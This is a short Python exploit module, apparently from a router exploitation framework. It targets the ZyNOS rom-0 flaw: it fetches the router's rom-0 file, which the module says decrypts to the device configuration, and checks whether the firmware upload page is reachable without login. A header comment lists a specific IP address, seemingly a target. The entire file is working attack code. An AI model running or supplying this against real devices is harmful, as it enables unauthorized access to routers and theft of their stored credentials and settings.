#Name:ZyNOS rom-0 config file download
#File:rom-0.py
#Author:Ján Trenčanský
#License: ADD LATER
#Created: 9.2.2014
#Last modified: 9.2.2014
#Shodan Dork:
#Description: Exploits rom-0 vulnerability in ZyNOS, downloads rom-0 file that can be decrypted to obtain config file
#             also checks if FWUpload.html is accessible without credentials
#87.16.244.138
import core.Exploit
import core.io

import requests


class Exploit(core.Exploit.RextExploit):
    def __init__(self):
        core.Exploit.RextExploit.__init__(self)

    def do_run(self, e):
        target = "http://" + self.host + ":" + self.port
        try:
            response = requests.get(target + "/rom-0", timeout=60)
            content_type = 'application/octet-stream'
            if response.status_code == requests.codes.ok and response.headers.get('Content-Type') == content_type:
                print("Success! Got rom-0 file, size:", len(response.content))
                core.io.writefile(response.content, "rom-0")
            else:
                print("Failed")
            print("Checking if rpFWUpload.html is available")
            response = requests.get(target + "/rpFWUpload.html", timeout=60)
            if response.status_code == requests.codes.ok:
                print("Success! rpFWUpload.html is accessible")
            else:
                print("rpFWUpload.html is not accessible")
        except requests.RequestException:
            print("Timeout!")

Exploit()
